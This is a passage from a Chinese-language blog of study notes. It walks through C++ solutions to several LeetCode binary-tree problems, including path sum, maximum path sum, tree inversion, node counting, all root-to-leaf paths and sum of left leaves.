class="keyword">if</span>(root==<span class="literal">nullptr</span>)   </span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        queue&lt;TreeNode*&gt; q_node;</span><br><span class="line">        queue&lt;<span class="keyword">int</span>&gt; q_val;</span><br><span class="line">        q_node.<span class="built_in">push</span>(root);</span><br><span class="line">        q_val.<span class="built_in">push</span>(root-&gt;val);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!q_node.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode *node = q_node.<span class="built_in">front</span>();</span><br><span class="line">            <span class="keyword">int</span> tmp = q_val.<span class="built_in">front</span>();</span><br><span class="line">            q_node.<span class="built_in">pop</span>();</span><br><span class="line">            q_val.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;left==<span class="literal">nullptr</span>&amp;&amp;node-&gt;right==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tmp==targetSum)&#123;</span><br><span class="line">                    <span class="built_in">getPath</span>(node);<span class="comment">//若该叶节点 符合条件，则调用getPath函数获取完整路径</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;left)&#123;</span><br><span class="line">                parent[node-&gt;left] = node;<span class="comment">//重点！！！！</span></span><br><span class="line">                q_node.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                q_val.<span class="built_in">push</span>(node-&gt;left-&gt;val+tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;right)&#123;</span><br><span class="line">                parent[node-&gt;right] = node;<span class="comment">//重点！！！！</span></span><br><span class="line">                q_node.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">                q_val.<span class="built_in">push</span>(node-&gt;right-&gt;val+tmp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="437-路径总和-III"><a href="#437-路径总和-III" class="headerlink" title="437 路径总和 III"></a>437 路径总和 III</h2><p>给定一个二叉树的根节点 root ，和一个整数 targetSum ，求该二叉树里节点值之和等于 targetSum 的 路径 的 【数目】。<br><strong>路径</strong>: <code>不需要从根节点开始</code>，<code>也不需要在叶子节点结束</code>，但是路径方向<code>必须是向下</code>的（只能从父节点到子节点）。</p>
<p><strong>路径方向是向下的！！！！</strong></p>
<p><strong>分析：</strong><br>穷举所有可能，访问每一个节点 node，检测以 node 为起始节点且<code>向下</code>延深的路径有多少种。我们<code>递归遍历</code>每一个节点的所有可能的路径，然后将这些<code>路径数目加起来</code>即为返回结果。</p>
<p>定义 rootSum(p,val) 表示以节点 p 为起点向下且满足路径总和为 val 的路径数目。我们对二叉树上每个节点 p 求出 rootSum(p,targetSum)，然后对这些路径数目求和即为返回结果。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">    时间复杂度：O(N^2)，其中 N 为该二叉树节点的个数。对于每一个节点，求以该节点为起点的路径数目时，则需要遍历以该节点为根节点的子树的所有节点，因此求该路径所花费的最大时间为 O(N)，我们会对每个节点都求一次以该节点为起点的路径数目。</span></span><br><span class="line"><span class="comment">    空间复杂度：O(N)，考虑到递归需要在栈上开辟空间。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//以某个起点开始 满足条件的路径 数目</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rootSum</span><span class="params">(TreeNode *root, <span class="keyword">long</span> targetSum)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> resNums = <span class="number">0</span>;<span class="comment">//符合条件targetSum路径数目</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val==targetSum)</span><br><span class="line">            resNums++;</span><br><span class="line">        resNums += <span class="built_in">rootSum</span>(root-&gt;left,targetSum-root-&gt;val);</span><br><span class="line">        resNums += <span class="built_in">rootSum</span>(root-&gt;right,targetSum-root-&gt;val);</span><br><span class="line">        <span class="keyword">return</span> resNums;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pathSum</span><span class="params">(TreeNode* root, <span class="keyword">int</span> targetSum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="built_in">rootSum</span>(root,targetSum);<span class="comment">//以根节点为起点 的路径数目</span></span><br><span class="line">        res += <span class="built_in">pathSum</span>(root-&gt;left,targetSum);<span class="comment">//以 左子树 为起点 的路径数目</span></span><br><span class="line">        res += <span class="built_in">pathSum</span>(root-&gt;right,targetSum);<span class="comment">//以 右子树 为起点 的路径数目</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>定义【节点前缀和】为：由根结点到当前结点的路径上所有节点的和。我们利用先序遍历二叉树，记录下根节点 root到当前节点 p 的路径上除当前节点以外所有节点的前缀和，在已保存的路径前缀和中查找是否存在前缀和刚好等于当前节点到根节点的前缀和 cur 减去 targetSum</p>
<p>假设当前从根节点 root 到节点 node 的前缀和为 curr，则此时我们在已保存的前缀和查找是否存在前缀和刚好等于 curr−targetSum。假设从根节点 root 到节点 node的路径中存在节点 pi​ 到根节点 root的前缀和为 curr−targetSum，则节点 pi+1​ 到 node 的路径上所有节点的和一定为 targetSum。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    O(N)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;<span class="keyword">long</span> <span class="keyword">long</span>,<span class="keyword">int</span>&gt; maap;<span class="comment">//第一个数表示【路径】，第二个数表示该路径的 【存在条数】</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(TreeNode *root,<span class="keyword">long</span> <span class="keyword">long</span> cur,<span class="keyword">int</span> targetSum)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        cur += root-&gt;val;<span class="comment">//前缀和</span></span><br><span class="line">        <span class="keyword">if</span>(maap.<span class="built_in">count</span>(cur-targetSum))</span><br><span class="line">            res = maap[cur-targetSum];<span class="comment">//找满足条件的 条数cur-targetSum存在，则 res加上 存的条数</span></span><br><span class="line">        maap[cur]++;<span class="comment">//从根节点到本结点 路径和是 cur 的条数</span></span><br><span class="line">        res += <span class="built_in">dfs</span>(root-&gt;left,cur,targetSum);</span><br><span class="line">        res += <span class="built_in">dfs</span>(root-&gt;right,cur,targetSum);</span><br><span class="line">        maap[cur]--;<span class="comment">//回溯！！！！！！！！前缀和 回退</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pathSum</span><span class="params">(TreeNode* root, <span class="keyword">int</span> targetSum)</span> </span>&#123;</span><br><span class="line">        maap[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//空路径0 的条数 1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dfs</span>(root,<span class="number">0</span>,targetSum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="124-二叉树中的最大路径和"><a href="#124-二叉树中的最大路径和" class="headerlink" title="124 二叉树中的最大路径和"></a>124 二叉树中的最大路径和</h2><p>二叉树中的【路径】被定义为一条节点序列，序列中每对相邻节点之间都存在一条边。同一个节点在一条路径序列中 至多出现一次 。该路径 至少包含一个 节点，且不一定经过根节点。<br>路径和 是路径中各节点值的总和。<br>给你一个二叉树的根节点 root ，返回其 最大路径和。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//最大路径和</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    O(N)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> maxSum = INT_MIN;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxPath</span><span class="params">(TreeNode *root)</span></span>&#123;<span class="comment">//以某结点为 根结点 ，找一条路径结点值和最大 的路径</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//int left = maxPath(root-&gt;left);这两句 不对</span></span><br><span class="line">        <span class="comment">//int right = maxPath(root-&gt;right);</span></span><br><span class="line">        <span class="keyword">int</span> left = <span class="built_in">max</span>(<span class="built_in">maxPath</span>(root-&gt;left),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> right = <span class="built_in">max</span>(<span class="built_in">maxPath</span>(root-&gt;right),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> maxPath = left+right+root-&gt;val;</span><br><span class="line">        <span class="comment">//更新</span></span><br><span class="line">        maxSum = <span class="built_in">max</span>(maxSum,maxPath);   <span class="comment">//最大路径和</span></span><br><span class="line">        <span class="keyword">return</span> root-&gt;val+<span class="built_in">max</span>(left,right);<span class="comment">//这句和上句不同：该句返回的是——对该结点来说，向下的路径有两条，向左走和向右走，返回val+max(left,right)就是 在返回路径最大的那条</span></span><br><span class="line">        <span class="comment">//return max(root-&gt;val,(root-&gt;val+max(left,right)));不对</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxPathSum</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">maxPath</span>(root);</span><br><span class="line">        <span class="keyword">return</span> maxSum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//最大直径——比较学习</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//全局遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">depth</span><span class="params">(TreeNode* root)</span></span>&#123;<span class="comment">//某棵树的最大深度</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//int left_max = depth(root-&gt;left);</span></span><br><span class="line">        <span class="comment">//int right_max = depth(root-&gt;right);</span></span><br><span class="line">        <span class="keyword">int</span> left_max = <span class="built_in">max</span>(<span class="built_in">depth</span>(root-&gt;left),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> right_max = <span class="built_in">max</span>(<span class="built_in">depth</span>(root-&gt;right),<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//更新：最大直径</span></span><br><span class="line">        res = <span class="built_in">max</span>(res,left_max+right_max);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(left_max,right_max)+<span class="number">1</span>;<span class="comment">//这句和上句不同，返回val+max(left,right)就是 在返回高度最大的那条</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">diameterOfBinaryTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> root_max = <span class="built_in">depth</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="226-翻转二叉树-转换为其【镜像】"><a href="#226-翻转二叉树-转换为其【镜像】" class="headerlink" title="226 翻转二叉树-转换为其【镜像】"></a>226 翻转二叉树-转换为其【镜像】</h3><p><strong>这道题目使用前序遍历和后序遍历都可以，唯独中序遍历不方便，因为中序遍历会把某些节点的左右孩子翻转了两次！</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归    【交换左右孩子】</span></span><br><span class="line"><span class="comment">    时间复杂度：O(N)    空间复杂度：O(N)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        TreeNode *left =  <span class="built_in">invertTree</span>(root-&gt;left);</span><br><span class="line">        TreeNode *right =  <span class="built_in">invertTree</span>(root-&gt;right);</span><br><span class="line">        root-&gt;left = right;</span><br><span class="line">        root-&gt;right = left;<span class="comment">//这两句相当于交换 左右孩子</span></span><br><span class="line">        <span class="comment">//swap(root-&gt;left,root-&gt;right);</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代——深度优先遍历</span></span><br><span class="line"><span class="comment">    前序遍历——迭代法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; stk;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            stk.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode *node = stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="built_in">swap</span>(node-&gt;left,node-&gt;right);<span class="comment">//关键：与前序遍历的区别</span></span><br><span class="line">            <span class="keyword">if</span>(node-&gt;left)</span><br><span class="line">                stk.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;right)</span><br><span class="line">                stk.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代——广度优先遍历</span></span><br><span class="line"><span class="comment">    层序遍历</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="built_in">swap</span>(node-&gt;left, node-&gt;right); <span class="comment">// 节点处理</span></span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="222-完全二叉树的节点个数"><a href="#222-完全二叉树的节点个数" class="headerlink" title="222 完全二叉树的节点个数"></a>222 完全二叉树的节点个数</h3><p>想到【两个思路】：</p>
<ul>
<li>层序遍历：看看是几层，由于是完全二叉树，直到层数即知道结点树<ul>
<li>2^h-1</li>
</ul>
</li>
<li>各种遍历方法，每遍历一个结点，个数+1</li>
</ul>
<p><strong>如果想判断 是 完全二叉树还是 满二叉树：两个指针，沿着左子树和沿着右子树 两个方向遍历次数是否相同</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//想到了 如果是满二叉树的话，可以很简便，直接循着左子树找深度即可，因为完全二叉树最后一行的空结点 只会出现在右边开始</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(root)&#123;</span><br><span class="line">            h++;<span class="comment">//深度</span></span><br><span class="line">            root = root-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(<span class="number">2</span>,h)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归-</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">order</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        int left = order(root-&gt;left);</span></span><br><span class="line"><span class="comment">        int right = order(root-&gt;right);</span></span><br><span class="line"><span class="comment">        return left+right+1;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + <span class="built_in">order</span>(root-&gt;left) + <span class="built_in">order</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">order</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    层序遍历：队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;<span class="comment">//这里是直接计数</span></span><br><span class="line">        <span class="keyword">while</span>(!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//本层 结点个数</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">                TreeNode *node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                count++;<span class="comment">//遍历一个结点 个数+1</span></span><br><span class="line">                <span class="keyword">if</span>(node-&gt;left)</span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(node-&gt;right)</span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="257-二叉树的所有路径"><a href="#257-二叉树的所有路径" class="headerlink" title="257 二叉树的所有路径"></a>257 二叉树的所有路径</h3><p>路径是从 <strong>根节点</strong> 开始的——&gt;<strong>前序遍历</strong><br><img src="https://img-blog.csdnimg.cn/7f8f0e29651247e796b1e99590858c22.png"><br><img src="https://img-blog.csdnimg.cn/538077e242ed4c9ebe31672adb242000.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//这里的参数 string path</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">paths_find</span><span class="params">(TreeNode *root, string path, vector&lt;string&gt;&amp; paths)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            path += <span class="built_in">to_string</span>(root-&gt;val);<span class="comment">//转字符串</span></span><br><span class="line">            <span class="comment">//当前结点是叶子结点，路径走到底了，把当前这条路径path加入结果集paths中</span></span><br><span class="line">            <span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">                paths.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">else</span>&#123;<span class="comment">//当前结点不是叶子结点，路径没有走到头，继续扩展path</span></span><br><span class="line">                path += <span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">                <span class="built_in">paths_find</span>(root-&gt;left,path,paths);</span><br><span class="line">                <span class="built_in">paths_find</span>(root-&gt;right,path,paths);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">binaryTreePaths</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; paths;<span class="comment">//结果集</span></span><br><span class="line">        string path = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">paths_find</span>(root,path,paths);</span><br><span class="line">        <span class="keyword">return</span> paths;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    // path += &quot;-&gt;&quot;;</span></span><br><span class="line"><span class="comment">    paths_find(root-&gt;left,path+&quot;-&gt;&quot;,paths);</span></span><br><span class="line"><span class="comment">    paths_find(root-&gt;right,path+&quot;-&gt;&quot;,paths);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代-队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">binaryTreePaths</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">       queue&lt;TreeNode*&gt; node_q; <span class="comment">//结点队列</span></span><br><span class="line">       queue&lt;string&gt; path_q;    <span class="comment">//路径队列</span></span><br><span class="line">       <span class="keyword">if</span>(root)&#123;</span><br><span class="line">           node_q.<span class="built_in">push</span>(root);</span><br><span class="line">           path_q.<span class="built_in">push</span>(<span class="string">&quot;&quot;</span>+<span class="built_in">to_string</span>(root-&gt;val));</span><br><span class="line">       &#125;</span><br><span class="line">       vector&lt;string&gt; res;<span class="comment">//结果集</span></span><br><span class="line">       <span class="keyword">while</span>(!node_q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">           TreeNode *node = node_q.<span class="built_in">front</span>();</span><br><span class="line">           node_q.<span class="built_in">pop</span>();</span><br><span class="line">           string path = path_q.<span class="built_in">front</span>();</span><br><span class="line">           path_q.<span class="built_in">pop</span>();</span><br><span class="line">           <span class="keyword">if</span>(node-&gt;left==<span class="literal">nullptr</span> &amp;&amp; node-&gt;right==<span class="literal">nullptr</span>)<span class="comment">//是叶子结点，则装入结果集</span></span><br><span class="line">                res.<span class="built_in">push_back</span>(path);</span><br><span class="line">           <span class="keyword">if</span>(node-&gt;left)&#123;</span><br><span class="line">               node_q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">               path_q.<span class="built_in">push</span>(path+<span class="string">&quot;-&gt;&quot;</span>+<span class="built_in">to_string</span>(node-&gt;left-&gt;val));</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span>(node-&gt;right)&#123;</span><br><span class="line">               node_q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">               path_q.<span class="built_in">push</span>(path+<span class="string">&quot;-&gt;&quot;</span>+<span class="built_in">to_string</span>(node-&gt;right-&gt;val));</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; </span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="404-左叶子之和"><a href="#404-左叶子之和" class="headerlink" title="404 左叶子之和"></a>404 左叶子之和</h3><p><strong>难点：如何判断是左叶子？</strong><br>判断当前节点是不是左叶子是<strong>无法判断</strong>的，必须要通过节点的父节点来判断其左孩子是不是左叶子。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归 不好理解</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">leftSum</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> left=<span class="number">0</span>,right=<span class="number">0</span>,sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left!=<span class="literal">nullptr</span> &amp;&amp; root-&gt;left-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;left-&gt;right==<span class="literal">nullptr</span>)&#123;<span class="comment">//左叶子</span></span><br><span class="line">            sum = root-&gt;left-&gt;val;<span class="comment">//root-&gt;left是左叶子</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            left = <span class="built_in">leftSum</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            right = <span class="built_in">leftSum</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> sum+left+right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">leftSum</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
